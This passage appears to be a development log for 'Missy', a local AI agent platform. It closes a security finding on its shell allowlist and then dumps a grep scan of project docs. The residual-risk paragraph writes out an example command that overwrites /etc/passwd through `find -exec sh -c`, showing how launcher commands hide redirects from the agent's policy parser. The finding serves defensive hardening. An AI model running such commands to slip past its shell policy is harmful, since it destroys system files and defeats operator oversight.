  `tests/policy/test_shell.py::TestExtractAllPrograms`.
- **Residual risk:** the launcher sub-finding is unaddressed — `find`,
  `xargs`, `bash`, `sh`, `python`, `sudo`, etc. remain allowlist-able
  with only a log warning, and a launcher's arguments can embed a
  nested shell command whose own redirects are invisible to this
  (or any) static command-string parser — confirmed by inspection:
  `find . -exec sh -c 'echo x > /etc/passwd' \;` tokenises the quoted
  `sh -c` argument as a single opaque string, so
  `extract_redirect_targets()` correctly does not (and structurally
  cannot) see the redirect inside it. Closing this requires either
  blocking launcher commands outright (a real behavioral/product change
  affecting legitimate scripting use cases, not a mechanical bug fix)
  or runtime-level interception (e.g. a sandboxed/traced subprocess),
  neither of which was attempted this checkpoint. Also not addressed:
  Incus tools' `resolve_shell_command()` (SR-1.5) always resolves to the
  literal string `"incus"`, so this new redirect check has no visibility
  into Incus's own argv-list-based `subprocess.run(["incus", ...])`
  invocation — correctly so, since Incus never uses `shell=True` and
  therefore has no shell-redirection attack surface of this kind at all.

---

- Timestamp: 2026-07-09 15:35:26 (raw grep-scan dump below, preserved
  for history; unrelated to the curated findings above — note it was
  captured from a different working tree path, `~/missy-loops/missy/`,
  and largely covers the prior "tool intelligence" overhaul, not this
  session's work)

## Expected common security and operations docs
- present: README.md
- present: docs/security.md
- present: docs/operations.md
- present: docs/discord.md

## Security and tool-intelligence scan
```
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:7:- Added an opt-in controlled runtime loader for enabled tool candidates.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:8:- Added persisted candidate `implementation` metadata with SQLite migration.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:10:- Runtime loading is gated by `tool_intelligence.candidate_runtime.enabled`.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:11:- The loader only registers enabled candidates for the active provider when
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:12:  provenance, schema, permissions, provider flags, implementation type, and
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:15:  `{"type": "delegated_tool", "tool": "<registered_tool>"}`.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:16:- Loader allow/deny outcomes emit structured candidate audit events.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:20:- Added tests for loader allow/deny behavior, runtime opt-in wiring, config
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:21:  parsing, and candidate-store implementation persistence.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:26:python3 -m pytest tests/vision/test_frame_eviction_hardening.py::TestCaptureDeadlineAwareSleep tests/tools/test_candidate_loader.py tests/tools/test_candidate_store.py tests/agent/test_tool_intelligence_wiring.py tests/config/test_settings.py -q
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:49:- Runtime loader supports only `delegated_tool`; additional adapters need
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:50:  separate policy, sandboxing, provenance, test, and rollback gates.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:51:- Provider fallback recommendations exist in CLI/provider gate code but are
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:52:  not yet surfaced in runtime responses when a tool is gated off.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:53:- Candidate review can import schema-score aggregates, but provider-family
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:54:  schema compatibility reporting is still limited.
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:59:Add safe CLI/API/operator controls for setting candidate implementation
/home/missy/missy-loops/missy/LAST_SESSION_SUMMARY.md:60:metadata, starting with `delegated_tool`, with typed confirmations and audit
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:9:| A1 | Streaming subscription state machine | tested | Core module and focused tests added; lightly wired to `AgentRuntime.run_stream()`. Needs channel/tool-loop integration. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:10:| A2 | Layered tool policy pipeline | hardened | `missy/policy/tool_policy_pipeline.py` is wired into `AgentRuntime._get_tools()` for runtime capability profiles and config-backed provider/global/agent/sandbox/subagent policy surfaces. Channel/group policy sources remain future hardening. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:13:| A5 | Auth profile cooldown + fallback | not_started | Provider registry/rate limiter work remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:14:| A6 | Per-provider tool schema normalization | not_started | Schema adapter work remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:18:| A10 | Sub-agent depth + child caps | not_started | SubAgentRunner persistence/tool policy work remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:29:| H_C | Persistent personal memory | not_started | Memory schema/CLI remains. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:31:| H_E | Genuine disagreement and pushback | not_started | Prompt fragment and audit logging remain. |
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:41:- Updated `AgentRuntime.run_stream()` to pass provider chunks through `AgentSubscription`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:45:- Session 2 added the A2 layered tool policy pipeline with profile bundles, group expansion, glob matching, inline `-tool` denies, `alsoAllow`, fail-warning unknown allowlists, and structured trace records.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:46:- Session 2 wired `AgentRuntime._get_tools()` to resolve tools through the pipeline and record `_last_tool_policy_decision` for audit/debugging.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:47:- Session 2 added `tests/policy/test_tool_policy_pipeline.py` and runtime coverage for policy decisions in `tests/agent/test_runtime_streaming.py`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:48:- Session 3 added config parsing for `tools.*`, `tools.byProvider`, `tools.byModel`, `tools.groups`, `agents.<id>.tools`, `agents.<id>.subagents.tools`, and `sandbox.tools`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:49:- Session 3 added `build_configured_tool_policy_layers()` and `collect_tool_policy_groups()` so runtime policy resolution now consumes YAML-backed provider/global/agent/sandbox/subagent layers.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:50:- Session 3 routed parsed tool policies into CLI-created runtimes for ask/run/gateway/API paths and documented the YAML surface in `docs/configuration.md`.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:51:- Session 3 added config, policy-pipeline, and runtime tests for those surfaces, then verified the full test suite and full-repo ruff.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:55:1. Harden A1 by routing provider/tool-loop stream events through `AgentSubscription` where Missy's providers expose stream events, not only the simple `run_stream()` path.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:56:2. Add the A7 `BlockChunker` and connect it to A1 flush points so pre-tool text can be delivered through Discord/CLI/Web in order.
/home/missy/missy-loops/missy/HUMANIZE_STATUS.md:58:4. Add channel/group policy sources on top of the A2 pipeline when Discord/CLI/Web channel identity context is available.
/home/missy/missy-loops/missy/LOOP_HEALTH.md:5:- Branch: overhaul/tools-20260709-174109
/home/missy/missy-loops/missy/LOOP_HEALTH.md:6:- Primary focus: complete tool usage and tool intelligence overhaul
/home/missy/missy-loops/missy/README.md:5:Missy is a production-grade agentic platform that runs entirely on your hardware. Default-deny network, filesystem sandboxing, shell whitelisting, encrypted vault, and structured audit logging — every capability is locked down until you explicitly allow it. Connect any AI provider. Deploy voice nodes throughout your home. Automate with scheduled jobs. Extend with tools, skills, and plugins.
/home/missy/missy-loops/missy/README.md:13:Most AI assistants trust the network, trust the model, and trust the plugins. Missy trusts nothing by default.
/home/missy/missy-loops/missy/README.md:18:- **No plugins** unless you approve them individually
/home/missy/missy-loops/missy/README.md:19:- **Every action** logged as structured JSONL with full audit trail
/home/missy/missy-loops/missy/README.md:20:- **Every audit event** signed with the agent's Ed25519 identity
/home/missy/missy-loops/missy/README.md:29:- **Multi-provider** — Anthropic (Claude), OpenAI (GPT), Ollama (local models) with automatic fallback and runtime hot-swap (`missy providers switch`)
/home/missy/missy-loops/missy/README.md:30:- **API key rotation** — multiple keys per provider, round-robin distribution
/home/missy/missy-loops/missy/README.md:32:- **Agentic runtime** — tool-augmented loops with done-criteria verification, learnings extraction, and self-tuning prompt patches
/home/missy/missy-loops/missy/README.md:33:- **AI Playbook** — auto-captures successful tool patterns, injects proven approaches into context, auto-promotes patterns with 3+ successes to skill proposals
/home/missy/missy-loops/missy/README.md:34:- **Attention system** — 5 brain-inspired subsystems (alerting, orienting, sustained, selective, executive) that track urgency, extract topics, maintain focus, and prioritize tools
/home/missy/missy-loops/missy/README.md:39:- **Interactive approval TUI** — real-time Rich terminal prompt for policy-denied operations (allow once / deny / allow always)
/home/missy/missy-loops/missy/README.md:40:- **Circuit breaker** — automatic backoff on provider failures (threshold=5, exponential to 300s)
/home/missy/missy-loops/missy/README.md:45:- **Failure tracking** — per-tool consecutive failure counts with automatic strategy rotation
/home/missy/missy-loops/missy/README.md:48:- **Code evolution** — self-evolving code modification engine with approval workflow and git-backed rollback
/home/missy/missy-loops/missy/README.md:49:- **Structured output** — Pydantic schema enforcement on LLM responses with automatic retry
/home/missy/missy-loops/missy/README.md:56:- **Multi-layer policy engine** — network (CIDR + domain + host), filesystem (per-path R/W), shell (command whitelist), L7 REST (HTTP method + path per host)
/home/missy/missy-loops/missy/README.md:57:- **Network presets** — `presets: ["anthropic", "github"]` auto-expands to correct hosts/domains/CIDRs
/home/missy/missy-loops/missy/README.md:58:- **Gateway enforcement** — all HTTP flows through `PolicyHTTPClient` with DNS rebinding protection, redirect blocking, scheme restrictions, interactive approval
/home/missy/missy-loops/missy/README.md:60:- **Prompt drift detection** — SHA-256 hashes system prompts, detects tampering between tool loop iterations
/home/missy/missy-loops/missy/README.md:63:- **Agent identity** — Ed25519 keypair at `~/.missy/identity.pem`, signs audit events, JWK export
/home/missy/missy-loops/missy/README.md:64:- **Trust scoring** — 0-1000 reliability tracking per tool/provider/MCP server with threshold warnings
/home/missy/missy-loops/missy/README.md:65:- **Container sandbox** — optional Docker-based isolation for tool execution (`--network=none`, memory/CPU limits)
/home/missy/missy-loops/missy/README.md:66:- **Landlock LSM** — Linux kernel-level filesystem enforcement via Landlock syscalls, complementing userspace policy
/home/missy/missy-loops/missy/README.md:67:- **Security scanner** — `missy security scan` audits installation for permission issues, config hygiene, exposed secrets
/home/missy/missy-loops/missy/README.md:68:- **MCP digest pinning** — SHA-256 verification of tool manifests; mismatches refuse to load
/home/missy/missy-loops/missy/README.md:72:- **CLI** — interactive REPL and single-shot queries with Rich formatting, capability modes (full/safe-chat/no-tools)
/home/missy/missy-loops/missy/README.md:73:- **Discord** — full Gateway WebSocket API, slash commands (`/ask`, `/status`, `/model`), DM allowlist, guild/role policies, image analysis
/home/missy/missy-loops/missy/README.md:75:- **Voice** — WebSocket server for edge nodes, faster-whisper STT, Piper TTS, device registry with PBKDF2 auth
/home/missy/missy-loops/missy/README.md:80:- **MCP servers** — connect external tool servers via `~/.missy/mcp.json`, auto-restart, digest pinning
/home/missy/missy-loops/missy/README.md:81:- **SKILL.md discovery** — scan directories for cross-agent portable skill definitions (`missy skills scan`)
/home/missy/missy-loops/missy/README.md:82:- **Tools, skills, plugins** — three extension tiers with increasing isolation and permission requirements
/home/missy/missy-loops/missy/README.md:85:- **Persona system** — YAML-backed agent identity/tone/style with backup, rollback, and audit logging
/home/missy/missy-loops/missy/README.md:93:- **Multi-provider** — Anthropic/OpenAI/Ollama image message formatting
/home/missy/missy-loops/missy/README.md:95:- **CLI tools** — `missy vision capture|inspect|review|doctor|health|benchmark|validate|memory`
/home/missy/missy-loops/missy/README.md:98:- **Browser tools** — Playwright-based Firefox automation (`pip install -e ".[desktop]"`)
/home/missy/missy-loops/missy/README.md:99:- **X11 tools** — window management and application launching
/home/missy/missy-loops/missy/README.md:100:- **Accessibility** — AT-SPI toolkit integration for GUI interaction
/home/missy/missy-loops/missy/README.md:103:- **Config presets** — `presets: ["anthropic", "github"]` replaces manual host lists
/home/missy/missy-loops/missy/README.md:106:- **Non-interactive setup** — `missy setup --provider anthropic --api-key-env ANTHROPIC_API_KEY --no-prompt`
/home/missy/missy-loops/missy/README.md:109:- **Audit logger** — every policy decision, provider call, and tool execution as JSONL, signed by agent identity
/home/missy/missy-loops/missy/README.md:110:- **Application logs** — rotating Python/provider diagnostics at `~/.missy/missy.log` (`missy logs tail`)
/home/missy/missy-loops/missy/README.md:130:The setup wizard walks you through configuring API keys, providers, network policy, and workspace paths. Once complete:
/home/missy/missy-loops/missy/README.md:152:missy setup --provider anthropic --api-key-env ANTHROPIC_API_KEY --no-prompt
/home/missy/missy-loops/missy/README.md:165:pip install -e ".[dev]"           # pytest, ruff, mypy, hypothesis, coverage tools
/home/missy/missy-loops/missy/README.md:182:(network,     (Anthropic, OpenAI,        (built-in tools,
/home/missy/missy-loops/missy/README.md:183: filesystem,   Ollama + fallback)         skills, plugins,
/home/missy/missy-loops/missy/README.md:199: Network ──► AuditLogger (signed) ──► ~/.missy/audit.jsonl
/home/missy/missy-loops/missy/README.md:205:Every outbound request — from providers, tools, plugins, MCP servers, Discord — passes through `PolicyHTTPClient`. No exceptions.
/home/missy/missy-loops/missy/README.md:217:  default_deny: true
/home/missy/missy-loops/missy/README.md:219:    - anthropic                  # auto-expands to api.anthropic.com + anthropic.com
/home/missy/missy-loops/missy/README.md:234:  enabled: false
/home/missy/missy-loops/missy/README.md:237:providers:
/home/missy/missy-loops/missy/README.md:238:  anthropic:
/home/missy/missy-loops/missy/README.md:239:    name: anthropic
/home/missy/missy-loops/missy/README.md:246:  enabled: false
/home/missy/missy-loops/missy/README.md:267:missy setup --no-prompt             # Non-interactive (--provider, --api-key-env, --model)
/home/missy/missy-loops/missy/README.md:268:missy ask PROMPT                    # Single-turn query (--provider, --session, --mode)
/home/missy/missy-loops/missy/README.md:269:missy run                           # Interactive REPL (--provider, --mode)
/home/missy/missy-loops/missy/README.md:270:missy providers list                # List providers and availability
/home/missy/missy-loops/missy/README.md:271:missy providers switch NAME         # Hot-swap active provider
/home/missy/missy-loops/missy/README.md:273:missy plugins                       # List plugins and their status
/home/missy/missy-loops/missy/README.md:279:# Security & audit
/home/missy/missy-loops/missy/README.md:280:missy audit recent                  # Recent events (--limit, --category)
/home/missy/missy-loops/missy/README.md:281:missy audit security                # Policy violations
/home/missy/missy-loops/missy/README.md:283:missy approvals list                # Pending human-in-the-loop approval requests
/home/missy/missy-loops/missy/README.md:297:missy discord status | probe | register-commands | audit
/home/missy/missy-loops/missy/README.md:301:missy devices list | pair | unpair | status | policy
/home/missy/missy-loops/missy/README.md:303:# MCP & skills
/home/missy/missy-loops/missy/README.md:305:missy skills                        # List registered skills
/home/missy/missy-loops/missy/README.md:306:missy skills scan                   # Discover SKILL.md files
/home/missy/missy-loops/missy/README.md:310:missy vision health | benchmark | validate | memory
/home/missy/missy-loops/missy/README.md:352:missy devices policy ID --mode full|safe-chat|muted
/home/missy/missy-loops/missy/README.md:362:python3 -m pytest tests/ -k "test_policy" -v         # Filter by name
/home/missy/missy-loops/missy/README.md:379:| [Configuration](https://missylabs.github.io/configuration/) | 7 | Full YAML reference, network/fs/shell policy, presets, providers |
/home/missy/missy-loops/missy/README.md:382:| [CLI Reference](https://missylabs.github.io/cli/) | 20 | Every command group, including gateway, discord, approvals, patches, sandbox, sessions |
/home/missy/missy-loops/missy/README.md:384:| [Providers](https://missylabs.github.io/providers/) | 5 | Anthropic, OpenAI, Ollama, runtime switching |
/home/missy/missy-loops/missy/README.md:385:| [Extending](https://missylabs.github.io/extending/) | 4 | Tools, plugins, MCP servers, SKILL.md |
/home/missy/missy-loops/missy/README.md:392:Developer-facing references in [`docs/`](docs/) — architecture, implementation deep-dives, persistence schema, module map.
/home/missy/missy-loops/missy/README.md:401:│                    attention, progress, approval, persona, behavior, hatching,
/home/missy/missy-loops/missy/README.md:412:├── policy/          Network, filesystem, shell, REST L7 policy engines + presets
/home/missy/missy-loops/missy/README.md:413:├── providers/       Anthropic, OpenAI, Ollama + registry with fallback & hot-swap
/home/missy/missy-loops/missy/README.md:414:├── scheduler/       APScheduler integration, human schedule parser
/home/missy/missy-loops/missy/README.md:417:├── skills/          Skill registry + SKILL.md discovery
/home/missy/missy-loops/missy/README.md:418:├── plugins/         Security-gated external plugin loader
/home/missy/missy-loops/missy/README.md:419:├── tools/           Built-in tools + registry (18+ tools)
/home/missy/missy-loops/missy/missy/tools/__init__.py:1:"""Missy tools framework — tool registry, base class, and built-in tools."""
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:9:- Mock LLM/provider calls. Behavioral tests should assert prompt fragments, state transitions, audit entries, cooldown decisions, or emitted channel timing calls.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:10:- Keep security and reliability separate from style: humanistic behaviors must not bypass policy, mutate tool results, or hide errors.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:22:  - Block flush at `text_end` and before tool execution.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:27:- A2 policy coverage: `tests/policy/test_tool_policy_pipeline.py`
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:29:  - Glob allow rules and inline `-tool` deny syntax compose in one layer.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:30:  - `alsoAllow` can restore matching tools after a restrictive layer.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:31:  - Unknown plugin-only allowlists warn without hiding core tools.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:32:  - Standard profile → provider → global → agent → group → sandbox → subagent layer ordering records trace labels.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:33:  - Config-backed provider/global/agent/sandbox/subagent layers preserve ordering and source labels.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:34:  - Custom `tools.groups` definitions extend the built-in group map.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:37:  - `tools.*`, `tools.byProvider`, nested `byModel`, `tools.groups`, `agents.<id>.tools`, `agents.<id>.subagents.tools`, and `sandbox.tools` parse from YAML.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:38:  - Invalid tool profiles fail with a configuration error.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:40:  - `AgentRuntime._get_tools()` records a `ToolPolicyDecision` and filters `safe-chat` through the A2 profile layer.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:42:  - `AgentRuntime._get_tools()` consumes config-backed global and agent policy surfaces.
/home/missy/missy-loops/missy/HUMANIZE_TEST_PLAN.md:54:| H_G | Apology appears for a tool failure once; gratitude and hedging do not duplicate in the same exchange. |
/home/missy/missy-loops/missy/HATCHING.md:17:3. **Verify Providers** — Checks for API keys (env vars or config) for at least one AI provider
/home/missy/missy-loops/missy/HATCHING.md:46:  - verify_providers
/home/missy/missy-loops/missy/HATCHING.md:51:persona_generated: true
/home/missy/missy-loops/missy/HATCHING.md:53:provider_verified: true
/home/missy/missy-loops/missy/HATCHING.md:78:The hatching system is checked during `missy run` and `missy ask`. If Missy has not been hatched, users are prompted to run `missy hatch` first. The persona generated during hatching is loaded by the agent runtime to shape all subsequent responses.
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:7:- default-deny network where practical
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:8:- exact provider endpoints
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:9:- exact benchmark and provider endpoints
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:15:- `delegated_tool` candidates inherit the permissions and policy checks of the
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:17:- Candidates that request network permission must still pass normal tool
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:18:  registry and policy-engine checks before execution.
/home/missy/missy-loops/missy/AUDIT_CONNECTIVITY.md:19:- No provider, Discord, plugin, MCP, benchmark, or external HTTP allowlist was
/home/missy/missy-loops/missy/docs/architecture.md:10:Missy is a **security-first**, **local-first**, **multi-provider** AI agent
/home/missy/missy-loops/missy/docs/architecture.md:13:access, filesystem writes, shell execution, plugin loading -- is disabled by
/home/missy/missy-loops/missy/docs/architecture.md:14:default and must be explicitly enabled through a YAML configuration file.
/home/missy/missy-loops/missy/docs/architecture.md:22:   policy engine before any bytes leave the machine.
/home/missy/missy-loops/missy/docs/architecture.md:23:3. **Audit everything** -- every policy decision, provider call, scheduler
/home/missy/missy-loops/missy/docs/architecture.md:24:   execution, and plugin action is recorded as a structured JSONL event.
/home/missy/missy-loops/missy/docs/architecture.md:34:  policy/          Network, filesystem, shell, REST L7 policy engines + presets
/home/missy/missy-loops/missy/docs/architecture.md:37:                   attention, progress, approval, persona, behavior, hatching,
/home/missy/missy-loops/missy/docs/architecture.md:41:  providers/       BaseProvider ABC, Anthropic, OpenAI, Ollama, registry + rate limiter
/home/missy/missy-loops/missy/docs/architecture.md:42:  tools/           Tool base class, registry, 18+ built-in tools
/home/missy/missy-loops/missy/docs/architecture.md:43:  skills/          Skill registry + SKILL.md discovery
/home/missy/missy-loops/missy/docs/architecture.md:44:  plugins/         Security-gated external plugin loader and base class
/home/missy/missy-loops/missy/docs/architecture.md:45:  scheduler/       APScheduler integration, human schedule parsing, job persistence
/home/missy/missy-loops/missy/docs/architecture.md:67: 3. Subsystem init        init_policy_engine(cfg)  -- network, filesystem, shell, REST L7
/home/missy/missy-loops/missy/docs/architecture.md:68:        |                 init_audit_logger(cfg.audit_log_path) + AgentIdentity (Ed25519)
/home/missy/missy-loops/missy/docs/architecture.md:69:        |                 init_registry(cfg) -- providers with rate limiter + fallback
/home/missy/missy-loops/missy/docs/architecture.md:71:        |                 init_tool_registry() -- 18+ built-in tools + MCP servers
/home/missy/missy-loops/missy/docs/architecture.md:78:        |                 Resolve provider (with fallback + circuit breaker)
/home/missy/missy-loops/missy/docs/architecture.md:82:        |                 Playbook injects proven tool patterns
/home/missy/missy-loops/missy/docs/architecture.md:85:        |                 All HTTP through PolicyHTTPClient -> policy + REST check
/home/missy/missy-loops/missy/docs/architecture.md:93: 8. Post-processing       Learnings extracted from tool-augmented runs
/home/missy/missy-loops/missy/docs/architecture.md:99:        |                 Events signed by AgentIdentity, appended to audit.jsonl
/home/missy/missy-loops/missy/docs/architecture.md:161:Every policy dataclass defaults to the most restrictive posture:
/home/missy/missy-loops/missy/docs/architecture.md:163:- `NetworkPolicy.default_deny = True`
/home/missy/missy-loops/missy/docs/architecture.md:164:- `ShellPolicy.enabled = False`
/home/missy/missy-loops/missy/docs/architecture.md:165:- `PluginPolicy.enabled = False`
/home/missy/missy-loops/missy/docs/architecture.md:168:An operator must explicitly add entries to allowlists before any capability is
/home/missy/missy-loops/missy/docs/architecture.md:173:All outbound HTTP traffic -- whether initiated by a provider, a tool, a plugin,
/home/missy/missy-loops/missy/docs/architecture.md:177:`get_policy_engine().check_network(host)`.  If the host is not on an allowlist,
/home/missy/missy-loops/missy/docs/architecture.md:180:The Anthropic and OpenAI providers use their own SDKs for HTTP, but their API
/home/missy/missy-loops/missy/docs/architecture.md:181:hosts must still appear in `network.allowed_hosts` for the initial policy check
/home/missy/missy-loops/missy/docs/architecture.md:182:at the gateway layer.  The Ollama provider routes directly through
/home/missy/missy-loops/missy/docs/architecture.md:193:- `category` (one of: `network`, `filesystem`, `shell`, `plugin`, `scheduler`, `provider`, `security`, `agent`, `tool`, `mcp`, `vision`)
/home/missy/missy-loops/missy/docs/architecture.md:194:- `result` (one of: `allow`, `deny`, `error`)
/home/missy/missy-loops/missy/docs/architecture.md:196:- `policy_rule` (optional rule name)
/home/missy/missy-loops/missy/docs/architecture.md:198:The `AuditLogger` (`missy/observability/audit_logger.py`) wraps the bus's
/home/missy/missy-loops/missy/docs/architecture.md:200:audit log file.
/home/missy/missy-loops/missy/docs/architecture.md:212:  +-> policy/engine
/home/missy/missy-loops/missy/docs/architecture.md:213:  +-> observability/audit_logger + observability/otel
/home/missy/missy-loops/missy/docs/architecture.md:214:  +-> providers/registry
/home/missy/missy-loops/missy/docs/architecture.md:216:  +-> scheduler/manager
/home/missy/missy-loops/missy/docs/architecture.md:217:  +-> plugins/loader
/home/missy/missy-loops/missy/docs/architecture.md:226:  +-> providers/registry + providers/base
/home/missy/missy-loops/missy/docs/architecture.md:228:  +-> tools/registry
/home/missy/missy-loops/missy/docs/architecture.md:232:  +-> agent/progress + agent/interactive_approval + agent/approval
/home/missy/missy-loops/missy/docs/architecture.md:240:providers/registry
/home/missy/missy-loops/missy/docs/architecture.md:241:  +-> providers/base
/home/missy/missy-loops/missy/docs/architecture.md:242:  +-> providers/anthropic_provider + openai_provider + ollama_provider
/home/missy/missy-loops/missy/docs/architecture.md:243:  +-> providers/rate_limiter
/home/missy/missy-loops/missy/docs/architecture.md:247:  +-> policy/engine + policy/rest_policy
/home/missy/missy-loops/missy/docs/architecture.md:248:  +-> agent/interactive_approval
/home/missy/missy-loops/missy/docs/architecture.md:251:policy/engine
/home/missy/missy-loops/missy/docs/architecture.md:252:  +-> policy/network + policy/filesystem + policy/shell + policy/rest_policy
/home/missy/missy-loops/missy/docs/architecture.md:253:  +-> policy/presets
/home/missy/missy-loops/missy/docs/architecture.md:259:  +-> tools/registry
/home/missy/missy-loops/missy/docs/architecture.md:265:scheduler/manager
/home/missy/missy-loops/missy/docs/architecture.md:266:  +-> scheduler/parser + scheduler/jobs
/home/missy/missy-loops/missy/docs/architecture.md:271:  +-> providers/base (for image formatting)
/home/missy/missy-loops/missy/docs/architecture.md:281:2. `init_policy_engine(cfg)` -- must come first; other subsystems depend on it
/home/missy/missy-loops/missy/docs/architecture.md:282:3. `init_audit_logger(cfg.audit_log_path)` -- wraps the event bus
/home/missy/missy-loops/missy/docs/architecture.md:283:4. `init_registry(cfg)` -- constructs provider instances
/home/missy/missy-loops/missy/docs/architecture.md:300:| Policy engine | `init_policy_engine(cfg)` | `get_policy_engine()` |
/home/missy/missy-loops/missy/docs/architecture.md:301:| Provider registry | `init_registry(cfg)` | `get_registry()` |
/home/missy/missy-loops/missy/docs/architecture.md:302:| Audit logger | `init_audit_logger(path)` | `get_audit_logger()` |
/home/missy/missy-loops/missy/docs/architecture.md:303:| Plugin loader | `init_plugin_loader(cfg)` | `get_plugin_loader()` |
/home/missy/missy-loops/missy/docs/architecture.md:304:| Skill registry | `init_skill_registry()` | `get_skill_registry()` |
/home/missy/missy-loops/missy/docs/architecture.md:305:| Tool registry | `init_tool_registry()` | `get_tool_registry()` |
/home/missy/missy-loops/missy/docs/README.md:9:| [Providers](providers.md) | Anthropic, OpenAI, Ollama setup and API key management |
/home/missy/missy-loops/missy/docs/README.md:11:| [Scheduler](scheduler.md) | Job scheduling with human-friendly syntax |
/home/missy/missy-loops/missy/docs/README.md:12:| [Skills & Plugins](skills-and-plugins.md) | Extension system: tools, skills, plugins |
/home/missy/missy-loops/missy/docs/README.md:20:| [Security](security.md) | Security policy, hardening guide, vulnerability reporting |
/home/missy/missy-loops/missy/docs/README.md:38:| [Policy Engine](implementation/policy-engine.md) | `missy/policy/` |
/home/missy/missy-loops/missy/docs/README.md:39:| [Provider Abstraction](implementation/provider-abstraction.md) | `missy/providers/` |
/home/missy/missy-loops/missy/docs/README.md:42:| [Audit Events](implementation/audit-events.md) | `missy/observability/` |
/home/missy/missy-loops/missy/docs/README.md:43:| [Persistence Schema](implementation/persistence-schema.md) | `missy/memory/`, `missy/scheduler/` |
/home/missy/missy-loops/missy/docs/README.md:44:| [Scheduler Execution](implementation/scheduler-execution.md) | `missy/scheduler/` |
/home/missy/missy-loops/missy/docs/README.md:46:| [Manifest Schema](implementation/manifest-schema.md) | Plugin/skill manifests |
/home/missy/missy-loops/missy/missy/security/container.py:1:"""Container-per-session sandbox for isolated tool execution.
/home/missy/missy-loops/missy/missy/security/container.py:18:      enabled: true
/home/missy/missy-loops/missy/missy/security/container.py:48:        enabled: Master switch for container sandboxing.
/home/missy/missy-loops/missy/missy/security/container.py:52:        network_mode: Docker network mode (``"none"`` disables networking).
/home/missy/missy-loops/missy/missy/security/container.py:55:    enabled: bool = False
/home/missy/missy-loops/missy/missy/security/container.py:67:        enabled=bool(data.get("enabled", False)),
/home/missy/missy-loops/missy/missy/security/container.py:130:            logger.debug("Docker not available — container sandbox disabled")
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:1:"""Controlled runtime loader for enabled tool candidates.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:4:does not execute generated code and does not infer behavior from a candidate
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:5:description. The first supported binding is ``delegated_tool``: a candidate
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:6:can become a schema/metadata wrapper around an already-registered tool, while
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:7:the normal :class:`missy.tools.registry.ToolRegistry` policy checks still run
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:8:for both the candidate wrapper and the delegated tool.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:19:from missy.tools.base import BaseTool, ToolPermissions, ToolResult
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:20:from missy.tools.registry import ToolRegistry
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:22:from .candidate_store import CandidateStore, ToolCandidate, ToolLifecycleState
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:35:_SUPPORTED_IMPLEMENTATIONS = {"delegated_tool"}
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:40:    """A candidate skipped by the runtime loader."""
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:42:    candidate_id: str
